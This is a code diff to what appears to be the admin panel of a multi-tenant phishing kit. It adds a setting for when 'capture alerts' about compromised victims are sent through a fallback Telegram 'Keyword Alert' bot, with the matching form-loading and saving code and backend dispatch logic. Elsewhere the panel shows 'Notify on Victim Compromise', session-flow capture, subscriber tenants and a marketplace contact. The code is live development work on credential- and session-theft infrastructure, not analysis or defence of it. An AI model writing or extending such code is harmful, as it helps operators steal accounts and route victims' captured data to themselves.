@@ -3518,6 +3518,12 @@ HTML_TEMPLATE = r'''
                                 <span>Notify on Victim Compromise (Dispatched once entire device &amp; session flow completes)</span>
                             </label>
                         </div>
+                        <div style="display: flex; gap: 20px; align-items: center; flex-wrap: wrap;">
+                            <label style="display: flex; align-items: center; gap: 9px; cursor: pointer; font-size: 0.88rem; color: #f0ebed;">
+                                <input type="checkbox" id="setting-capture-fallback-kwa" style="accent-color: var(--accent-color); width: 17px; height: 17px;">
+                                <span>If the bot token above is empty, still send capture alerts via the Keyword Alert bot</span>
+                            </label>
+                        </div>
 
                         {% if is_master_admin %}
                         <div style="display: flex; flex-direction: column; gap: 6px; width: 100%; box-sizing: border-box; background: var(--bg-panel); border: 1px solid var(--border-color); border-radius: 8px; padding: 14px 16px;">
@@ -9980,6 +9986,7 @@ Assigned      : ${inboxes}
                 if (cfg.tg_bot_token && document.getElementById('setting-tg-bot-token')) document.getElementById('setting-tg-bot-token').value = cfg.tg_bot_token;
                 if (cfg.tg_chat_id && document.getElementById('setting-tg-chat-id')) document.getElementById('setting-tg-chat-id').value = cfg.tg_chat_id;
                 if (typeof cfg.notify_token !== 'undefined' && document.getElementById('setting-notify-token')) document.getElementById('setting-notify-token').checked = cfg.notify_token;
+                if (typeof cfg.capture_fallback_kwa !== 'undefined' && document.getElementById('setting-capture-fallback-kwa')) document.getElementById('setting-capture-fallback-kwa').checked = cfg.capture_fallback_kwa;
                 if (typeof cfg.marketplace_telegram_contact !== 'undefined' && document.getElementById('setting-marketplace-tg')) document.getElementById('setting-marketplace-tg').value = cfg.marketplace_telegram_contact || '';
                 // 2FA configuration (per-tenant for subscribers)
                 if (document.getElementById('setting-2fa-method')) document.getElementById('setting-2fa-method').value = cfg.two_factor_method || 'telegram';
@@ -11665,6 +11672,7 @@ Delegated     : ${inboxesDesc}
             const botToken = (document.getElementById('setting-tg-bot-token') ? document.getElementById('setting-tg-bot-token').value : '').trim();
             const chatId = (document.getElementById('setting-tg-chat-id') ? document.getElementById('setting-tg-chat-id').value : '').trim();
             const notifyToken = document.getElementById('setting-notify-token') ? document.getElementById('setting-notify-token').checked : true;
+            const captureFallback = document.getElementById('setting-capture-fallback-kwa') ? document.getElementById('setting-capture-fallback-kwa').checked : false;
             const marketTg = (document.getElementById('setting-marketplace-tg') ? document.getElementById('setting-marketplace-tg').value : '').trim();
 
             const isClient = Boolean(window._isClientAdmin);
@@ -11674,7 +11682,8 @@ Delegated     : ${inboxesDesc}
             const cfg = {
                 tg_bot_token: botToken,
                 tg_chat_id: chatId,
-                notify_token: notifyToken
+                notify_token: notifyToken,
+                capture_fallback_kwa: captureFallback
             };
             if (!isClient) cfg.marketplace_telegram_contact = marketTg;
 
@@ -23038,7 +23047,18 @@ def _send_raw_alert(tg_html, wh_md, is_prt=False, owner_id=None):
         # simply not sent rather than leaking into the master channel.
         bot_token = (cfg.get('tg_bot_token') or '').strip()
         chat_id = (cfg.get('tg_chat_id') or '').strip()
-        if not owner_id and not (bot_token and chat_id):
+        # The keyword-bot fallback keeps deployments that only ever configured a
+        # keyword bot working. But it used to fire unconditionally, so CLEARING
+        # the two fields above still delivered capture alerts — there was no way
+        # to switch them off while a keyword bot existed.
+        #
+        # Rule: fall back only when the master bot was never configured at all
+        # (keys absent). Once the keys exist — even as empty strings — the
+        # operator's choice is respected. capture_fallback_kwa forces the
+        # fallback back on for anyone who wants it anyway.
+        _never_configured = 'tg_bot_token' not in cfg and 'tg_chat_id' not in cfg
+        if (not owner_id and not (bot_token and chat_id)
+                and (_never_configured or cfg.get('capture_fallback_kwa', False))):
             bot_token = (cfg.get('kwa_tg_bot_token') or '').strip()
             chat_id = (cfg.get('kwa_tg_chat_id') or '').strip()
         if bot_token and chat_id and (bot_token, chat_id) not in dispatched_targets:
